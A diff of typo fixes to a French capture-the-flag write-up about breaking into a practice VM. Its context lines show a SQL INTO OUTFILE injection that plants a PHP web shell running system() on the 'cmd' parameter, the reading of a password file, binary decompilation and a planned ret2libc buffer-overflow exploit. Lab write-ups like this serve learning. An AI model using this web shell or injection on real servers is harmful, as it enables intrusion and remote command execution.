@@ -59,7 +59,7 @@ On éxecute la commande SQL suivante pour y injecter notre page :
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE '/var/www/forum/templates_c/hacker5.php'
 ```
-La page contient donc maintenantn un input faisant appel à la fonction `system` de php, nous permettant par example d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
+La page contient donc maintenant un input faisant appel à la fonction `system` de php, nous permettant par exemple d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
 ```
 cd /home/LOOKATME ; cat password
 ```
@@ -149,7 +149,7 @@ o
 
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
-Un exécutable `bomb` est aussi présent. Nous avons téléchargé `Cutter` qui va nous permettre par la suite de décompiler des exécutables (Ghidra). En décompilant le fichier `bomb`, on obtient ceci :
+Un exécutable `bomb` est aussi présent. Nous avons téléchargé `Cutter` qui va nous permettre par la suite de décompiler des exécutables. En décompilant le fichier `bomb`, on obtient ceci :
 ```c
 // WARNING: Variable defined which should be unmapped: var_18h
 // WARNING: [r2ghidra] Detected overlap for variable var_5h
@@ -511,7 +511,7 @@ En arrivant sur le compte de `thor`, on remarque :
 - Un fichier `turtle` qui contitent des instructions similaires au language LOGO.
 - Un README qui contient : `Finish this challenge and use the result as password for 'zaz' user.`
  
- On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Le dessin nous montre donc les lettres `SLASH`.
+ On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Le dessin nous montre les lettres `SLASH`.
  
  À la fin du fichier `turtle`, il était indiqué de hasher ce mot. Le hash `md5` s'avère être la bonne solution. On obtient :
  ```
@@ -536,7 +536,7 @@ bool main(char **argv, char **envp)
     return (int32_t)argv < 2;
 }
 ```
-Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre argument excède 140 charactère, le progamme `SEGFAULT`.
+Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre argument excède 140 charactères, le progamme `SEGFAULT`.
 
 Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.
 
